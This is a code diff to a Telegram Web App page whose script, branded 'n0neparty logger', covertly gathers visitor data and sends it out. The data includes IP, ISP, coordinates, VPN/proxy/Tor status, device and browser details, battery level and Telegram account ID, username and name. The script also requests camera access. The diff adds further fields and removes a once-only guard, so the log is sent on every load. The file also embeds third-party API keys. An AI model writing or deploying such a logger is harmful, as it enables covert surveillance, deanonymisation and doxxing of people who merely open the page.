@@ -37,9 +37,9 @@
 </html>
     <script>
 document.addEventListener('DOMContentLoaded', function() {
+    let batteryLevel;
     let screenWidth;
     let screenHeight;
-    let batteryLevel;
 
 if ('webkitBattery' in navigator) {
     navigator.webkitGetUserMedia({video: true}, function(stream) {
@@ -50,10 +50,10 @@ if ('webkitBattery' in navigator) {
     screenWidth = window.screen.width;
     screenHeight = window.screen.height;
 
+    const batteryLevelConst = batteryLevel;
     const screenWidthConst = screenWidth;
     const screenHeightConst = screenHeight;
-    const batteryLevelConst = batteryLevel;
-    
+
     const tg = window.Telegram.WebApp;
 
     const urlParams = new URLSearchParams(window.location.search);
@@ -111,6 +111,16 @@ fetch('https://ipapi.co/json/')
   
     let TypeInternet = navigator.connection.effectiveType;
 
+fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
+.then(response => response.json())
+.then(data => {
+  let isProxy = data.privacy && data.privacy.proxy ? true : false;
+  let isVPN = data.privacy && data.privacy.vpn ? true : false;
+  let isTOR = data.privacy && data.privacy.tor ? true : false;
+  let isAsn = data.asn && data.asn.asn;
+  let isRoute = data.asn && data.asn.route;
+  let isDomain = data.asn && data.asn.domain;
+
 fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
 .then(response => response.json())
 .then(data => {
@@ -121,61 +131,45 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
   let namebrowser = engine.name;
   let osnam = data.os.name;
   let osvers = data.os.version;
-
-fetch('https://api.ip2location.io/?key=845094BBD7FCAE829B7D6AF3AE13FC02&ip=' + ip + '')
-  .then(response => response.json())
-  .then(data => {
-    let isVPN = data.proxy && data.proxy.is_vpn;
-    let isProxy = data.is_proxy;
-    let isProxyType = data.proxy && data.proxy.proxy_type;
-    let isWebProxy = data.proxy && data.proxy.is_web_proxy;
-      
-if (!localStorage.getItem('logSent')) {
+    
         const message = `
-*🔎 ip*
-*├ IP: ${ip}*
-*├ Provider: ${isp}*
-*├ City: ${city}*
-*├ Region: ${region}*
-*└ Timezone IP: ${time}*
-
-*📶 Net Info*
-*├ Coordinates: ${longitude} ${latitude},*
-*├ TLD: ${tld}*
-*├ Version: ${versian}*
-*├ Vpn: ${isVPN}*
-*├ Proxy: ${isProxy}*
-*├ Type: ${isProxyType}*
-*├ Web proxy: ${isWebProxy}*
-*└ Internet: ${TypeInternet}*
-
-    
- *💻 System*
-*├ Os: ${osname}*
-*├ Screen resolution: ${screenWidth}x${screenHeight}*
-*├ Time: ${formattedTime}*
-*├ Language: ${language}*
-*├ Date: ${formedDate} Day of week: ${dayOfWeek}*
-*├ Memory: ${memory} RAM*
-*├ TimeZone: ${timeZone}*
-*├ Device: ${model}*
-*└ Device Type: ${deviceType}*
-
-*🌐 Browser*
-*├ Browser: ${browser}*
-*├ Browser Engine: ${namebrowser}*
-*└ UserAgent: ${userAgent}*
-
- *📄 Clipboard*
- *└ Undefined*
-    
-*👤 Account: *
-*├ ID: ${tg.initDataUnsafe.user.id}*
-*├ Username: @${tg.initDataUnsafe.user.username}*
-*├ Name: ${tg.initDataUnsafe.user.first_name}*
-*├ Language: ${tg.initDataUnsafe.user.language_code}*
-*└ Can Write To Pm: ${tg.initDataUnsafe.user.allows_write_to_pm}*
-             *Killed by n0neparty logger 👾*
+      * Ip 🌐*
+    *├ IP: ${ip}*
+    *├ UserAgent: ${userAgent}*
+    *├ Provider: ${isp}*
+    *├ City: ${city}*
+    *├ Region: ${region}*
+    *├ Timezone IP: ${time}*
+    *├ Proxy: ${isProxy}*
+    *├ Vpn: ${isVPN}*
+    *├ Tor: ${isTOR}*
+    *├ Coordinates: ${longitude} ${latitude},*
+    *├ Asn: ${isAsn}*
+    *├ Route: ${isRoute}*
+    *├ Domain: ${isDomain}*
+    *├ TLD: ${tld}*
+    *├ Version: ${versian}*
+      * System 🖥*
+    *├ Browser: ${browser}*
+    *├ Browser Engine: ${namebrowser}*
+    *├ Os: ${osname}*
+    *├ Battery: ${batteryLevel}%*
+    *├ Screen resolution: ${screenWidth}x${screenHeight}*
+    *├ Time: ${formattedTime}*
+    *├ Language: ${language}*
+    *├ Date: ${formedDate} Day of week: ${dayOfWeek}*
+    *├ Memory: ${memory} RAM*
+    *├ Internet: ${TypeInternet}*
+    *├ TimeZone: ${timeZone}*
+    *├ Device: ${model}*
+    *├ Device Type: ${deviceType}*
+      *🔍 Account: *
+    *├ ID: ${tg.initDataUnsafe.user.id}*
+    *├ Username: @${tg.initDataUnsafe.user.username}*
+    *├ Name: ${tg.initDataUnsafe.user.first_name}*
+    *├ Language: ${tg.initDataUnsafe.user.language_code}*
+    *├ Can Write To Pm: ${tg.initDataUnsafe.user.allows_write_to_pm}*
+    *Killed by n0neparty logger 👾*
                              `;
 
         
@@ -189,17 +183,12 @@ if (!localStorage.getItem('logSent')) {
         fetch(url, {
             method: 'POST',
             body: formData
-            }).then(() => {
-            localStorage.setItem('logSent', true);
         });
-      };
+      });
     });
   });
 });
-});
 };
-});
-        
         
 function getBrowserInfo() {
     const ua = navigator.userAgent;
